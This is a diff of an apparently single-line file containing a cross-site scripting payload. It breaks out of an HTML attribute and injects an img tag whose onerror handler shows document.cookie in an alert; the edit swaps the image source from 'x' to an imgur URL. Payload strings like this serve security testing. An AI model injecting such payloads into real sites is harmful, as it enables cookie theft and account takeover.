@@ -1,1 +1,1 @@
-"/><img src=x onerror=alert(document.cookie)>
+"/><img src=https://i.imgur.com/VEp1OKU.jpeg onerror=alert(document.cookie)>
